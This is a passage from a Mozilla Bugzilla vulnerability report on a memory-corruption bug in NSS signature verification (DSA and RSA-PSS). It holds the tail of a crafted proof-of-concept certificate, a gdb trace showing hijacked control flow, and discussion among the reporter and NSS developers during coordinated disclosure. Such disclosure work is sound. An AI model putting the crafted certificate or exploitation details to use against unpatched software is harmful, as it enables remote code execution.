////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////w==
-----END CERTIFICATE-----
</code></pre>
<p>Project Zero Boilerplate:</p>
<p>This bug is subject to a 90-day disclosure deadline. If a fix for this<br>
issue is made available to users before the end of the 90-day deadline,<br>
this bug report will become public 30 days after the fix was made<br>
available. Otherwise, this bug report will become public at the deadline.<br>
The scheduled deadline is 2022-01-22.</p>
</div></div><div class="change-set" id="c1"><div class="comment" data-id="15626069" data-no="1"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-1" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" ><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" ><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-1"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-1" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c1">Comment 1</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-24 08:15 PDT" data-time="1635088547">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-1">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-1" data-comment-id="15626069"><p>Thanks for the report Tavis !</p>
</div><div class="activity"><div class="change">Flags: needinfo?(bbeurdouche)</div></div></div><div class="change-set" id="c2"><div class="comment" data-id="15626101" data-no="2"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-2" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" ><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" ><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-2"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-2" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c2">Comment 2</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-24 09:03 PDT" data-time="1635091408">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-2">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-2" data-comment-id="15626101"><p>I haven&#39;t checked if the same bug affects macOS, IIUC they forked an ancient version of NSS? Maybe you know the right people to ask.</p>
<p>This code seems to have been around for a long time (at least since 2008 or so?)</p>
<p>Oh, I used SHA-1 in my test certificate, but I can&#39;t remember if that required a build-time option to enable. It doesn&#39;t matter for the bug, so I can make a SHA-256 version, or non-self signed version if that helps.</p>
</div></div><div class="change-set" id="c3"><div class="comment" data-id="15626106" data-no="3"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-3" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" ><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" ><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-3"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-3" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c3">Comment 3</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-24 09:13 PDT" data-time="1635092028">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-3">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-3" data-comment-id="15626106"><p>(In reply to taviso from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c2" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #2</a>)</p>
<blockquote>
<p>I haven&#39;t checked if the same bug affects macOS, IIUC they forked an ancient version of NSS? Maybe you know the right people to ask.</p>
</blockquote>
<p>I&#39;ll have a look if this code is used on macOS and reach out to them if it is the case.</p>
<blockquote>
<p>This code seems to have been around for a long time (at least since 2008 or so?)</p>
</blockquote>
<p>At least, indeed, but it might actually be much older...</p>
<blockquote>
<p>Oh, I used SHA-1 in my test certificate, but I can&#39;t remember if that required a build-time option to enable. It doesn&#39;t matter for the bug, so I can make a SHA-256 version, or non-self signed version if that helps.</p>
</blockquote>
<p>I am pretty sure it didn&#39;t require an option, though in Firefox we might have more guards against using these certificates.<br>
I&#39;ll have a look and keep you in the loop ! : ) Thank you !</p>
</div></div><div class="change-set" id="c4"><div class="comment" data-id="15626148" data-no="4"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-4" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" ><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" ><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-4"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-4" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c4">Comment 4</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-24 11:21 PDT" data-time="1635099683">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-4">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-4" data-comment-id="15626148"><p>The hashobj contains function pointers, so redirecting execution is trivial:</p>
<p><a href="https://searchfox.org/mozilla-central/source/security/nss/lib/cryptohi/secvfy.c#622" rel="nofollow">https://searchfox.org/mozilla-central/source/security/nss/lib/cryptohi/secvfy.c#622</a></p>
<pre><code>Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7d6625c in VFY_Begin () from /usr/lib/x86_64-linux-gnu/libnss3.so
(gdb) bt
#0  0x00007ffff7d6625c in VFY_Begin () from /usr/lib/x86_64-linux-gnu/libnss3.so
#1  0x00007ffff7d66635 in ?? () from /usr/lib/x86_64-linux-gnu/libnss3.so
#2  0x00007ffff7d66984 in VFY_VerifyDataWithAlgorithmID () from /usr/lib/x86_64-linux-gnu/libnss3.so
#3  0x00007ffff7d5bf07 in CERT_VerifySignedDataWithPublicKey () from /usr/lib/x86_64-linux-gnu/libnss3.so
#4  0x00007ffff7d5c1dd in CERT_VerifySignedData () from /usr/lib/x86_64-linux-gnu/libnss3.so
#5  0x00007ffff7d5c881 in ?? () from /usr/lib/x86_64-linux-gnu/libnss3.so
#6  0x00007ffff7d5dc13 in CERT_VerifyCertificate () from /usr/lib/x86_64-linux-gnu/libnss3.so
#7  0x000055555555a1c9 in ?? ()
#8  0x00007ffff7b76e4a in __libc_start_main (main=0x555555559aa0, argc=2, argv=0x7fffffffdec8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdeb8) at ../csu/libc-start.c:314
#9  0x000055555555a75a in ?? ()
(gdb) x/i $pc
=&gt; 0x7ffff7d6625c &lt;VFY_Begin+28&gt;:	call   QWORD PTR [rax+0x18]
(gdb) p/x $rax
$1 = 0x4141414141414141
</code></pre>
<p>(I&#39;m just using vfychain to test)</p>
</div></div><div class="change-set" id="c5"><div class="comment" data-id="15628749" data-no="5"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-5" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349244" ><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349244" ><a class="email " href="/user_profile?user_id=349244" > <span class="fna">Dana Keeler (she/her) (use needinfo) [:keeler]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-5"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-5" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c5">Comment 5</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-25 10:16 PDT" data-time="1635182173">3 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1737470&amp;comment_id=15628749"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-5">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-5" data-comment-id="15628749"><p><del>At a glance, Firefox is vulnerable to this in multiple places.</del><br>
Looking closer, since Firefox always specifies <code>SEC_OID_ANSIX962_EC_PUBLIC_KEY</code> and only accepts EC keys, it doesn&#39;t seem to be vulnerable to this.</p>
</div></div><div class="change-set" id="c6"><div class="comment" data-id="15629001" data-no="6"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-6" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" ><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" ><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-6"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-6" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c6">Comment 6</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-25 12:55 PDT" data-time="1635191727">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-6">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-6" data-comment-id="15629001"><p>@Tavis, I checked with them, Apple apparently don&#39;t use that code.</p>
</div></div><div class="change-set" id="c7"><div class="comment" data-id="15629005" data-no="7"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-7" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" ><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" ><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-7"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-7" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c7">Comment 7</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-25 12:58 PDT" data-time="1635191914">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-7">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-7" data-comment-id="15629005"><p>Understood, thanks so much for checking!</p>
</div></div><div class="change-set" id="a117734_1689"><div class="change" id="aa117734_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a117734_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a117734_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a117734_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a117734_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a117734_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-25 16:41 PDT" data-time="1635205291">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Status: UNCONFIRMED &rarr; NEW</div><div class="change">Ever confirmed: true</div><div class="change">Whiteboard: [disclosure deadline is 2022-01-22]</div></div></div><div class="change-set" id="a122616_1689"><div class="change" id="aa122616_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a122616_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a122616_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a122616_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a122616_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a122616_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-25 18:02 PDT" data-time="1635210173">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox93&amp;o1=isnotempty">status-firefox93</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox93&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox94&amp;o1=isnotempty">status-firefox94</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox94&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox95&amp;o1=isnotempty">status-firefox95</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox95&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr78&amp;o1=isnotempty">status-firefox-esr78</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr78&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr91&amp;o1=isnotempty">status-firefox-esr91</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr91&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox94&amp;o1=isnotempty">tracking-firefox94</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox94&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox95&amp;o1=isnotempty">tracking-firefox95</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox95&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr91&amp;o1=isnotempty">tracking-firefox-esr91</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr91&amp;o1=equals&amp;v1=94%2B">94+</a></div><div class="change">Keywords: <a href="/buglist.cgi?keywords=csectype-bounds&amp;resolution=---">csectype-bounds</a>, 
          
            <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a></div></div></div><div class="change-set" id="c8"><div class="comment" data-id="15629858" data-no="8"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-8" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_644159" id="a122616_1689"><img src="https://secure.gravatar.com/avatar/46fbd084ad1a893caecbb3d539951e40?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_644159" id="a122616_1689"><a class="email " href="/user_profile?user_id=644159" > <span class="fna">Dennis Jackson</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-8"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-8" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c8">Comment 8</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-26 06:40 PDT" data-time="1635255644">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-8">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9247769"
         class="attachment"
         data-id="9247769" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="phabricator-D129514-url.txt">
      <meta itemprop="contentSize" content="48">
      <meta itemprop="encodingFormat" content="text/x-phabricator-request">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9247769" itemprop="contentUrl" >
        <span id="att-9247769-description" itemprop="description">Bug 1737470 - Ensure DER encoded signatures are within size limits. r=jschanck,mt,bbeurdouche,rrelyea</span></a>
        â€” <a href="attachment.cgi?id=9247769&amp;action=edit" itemprop="url" data-details="1">Details</a>
      </div>
    </div>

  <div
      class="comment-text markdown-body empty"
      id="ct-8" data-comment-id="15629858"></div></div><div class="change-set" id="c9"><div class="comment" data-id="15630453" data-no="9"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-9" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a122616_1689"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a122616_1689"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-9"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-9" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c9">Comment 9</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-26 10:54 PDT" data-time="1635270855">3 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1737470&amp;comment_id=15630453"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-9">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-9" data-comment-id="15630453"><p>@Bob, our current thinking is that Firefox is not affected because of the way mozpkix builds the certificate chains.<br>
Can you please have a look and see how this affects RedHat, so that we can coordinate on which NSS release to target? Thx</p>
</div><div class="activity"><div class="change">Flags: needinfo?(rrelyea)</div></div></div><div class="change-set" id="c10"><div class="comment" data-id="15630468" data-no="10"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-10" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a122616_1689"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a122616_1689"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-10"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-10" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c10">Comment 10</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-26 11:02 PDT" data-time="1635271324">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-10">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-10" data-comment-id="15630468"><p>@Tavis, from what we could see, it really looks to us like an issue with DSA certs and not an ECDSA ones (title), is that correct or are we missing something obvious? :) Thank you!</p>
</div><div class="activity"><div class="change">Flags: needinfo?(taviso)</div></div></div><div class="change-set" id="c11"><div class="comment" data-id="15630488" data-no="11"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-11" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a122616_1689"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a122616_1689"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-11"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-11" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c11">Comment 11</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-26 11:14 PDT" data-time="1635272080">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-11">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-11" data-comment-id="15630488"><p>Oops, my mistake.</p>
<p>I did a little spelunking in the commit history, you can see the current code starts to take form here:</p>
<p><a href="https://hg.mozilla.org/projects/nss/diff/6a5aef244b4390570f4066f6e304752217223988/security/nss/lib/cryptohi/secvfy.c#l1.114" rel="nofollow">https://hg.mozilla.org/projects/nss/diff/6a5aef244b4390570f4066f6e304752217223988/security/nss/lib/cryptohi/secvfy.c#l1.114</a></p>
<p>That is an accurate refactor of the previous code, so the bug wasn&#39;t introduced here (just copied over to the new form).</p>
<p>I think the original code had this bug (from around 2003), and it just survived 20 years of refactoring:</p>
<p><a href="https://hg.mozilla.org/projects/nss/annotate/41f5eb9e5df23951883ba3243f3ae51550663d77/security/nss/lib/cryptohi/secvfy.c#l145" rel="nofollow">https://hg.mozilla.org/projects/nss/annotate/41f5eb9e5df23951883ba3243f3ae51550663d77/security/nss/lib/cryptohi/secvfy.c#l145</a></p>
<p>I&#39;m a bit confused why this wasn&#39;t caught earlier, I was doing some (moderately) novel fuzzing, but this doesn&#39;t seem like it should have required any new groundbreaking research. Perhaps the difference is that I&#39;ve been annoying colleagues with ASN.1 encoding questions for a few weeks, and using it to improve my fuzzing :)</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(taviso)</span></div></div></div><div class="change-set" id="c12"><div class="comment" data-id="15631866" data-no="12"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-12" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a122616_1689"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a122616_1689"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-12"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-12" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c12">Comment 12</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-27 10:25 PDT" data-time="1635355557">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-12">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-12" data-comment-id="15631866"><p>Perhaps you&#39;ve already noticed this, but the exact same bug exists here with SEC_OID_PKCS1_RSA_PSS_SIGNATURE:</p>
<p><a href="https://searchfox.org/mozilla-central/source/security/nss/lib/cryptohi/secvfy.c#484" rel="nofollow">https://searchfox.org/mozilla-central/source/security/nss/lib/cryptohi/secvfy.c#484</a></p>
<p>I&#39;ve made a demo certificate, would you like it, or did you already know about it?</p>
</div></div><div class="change-set" id="c13"><div class="comment" data-id="15631903" data-no="13"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-13" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a122616_1689"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a122616_1689"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-13"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-13" >
        <td>
          <h3 class="change-name">
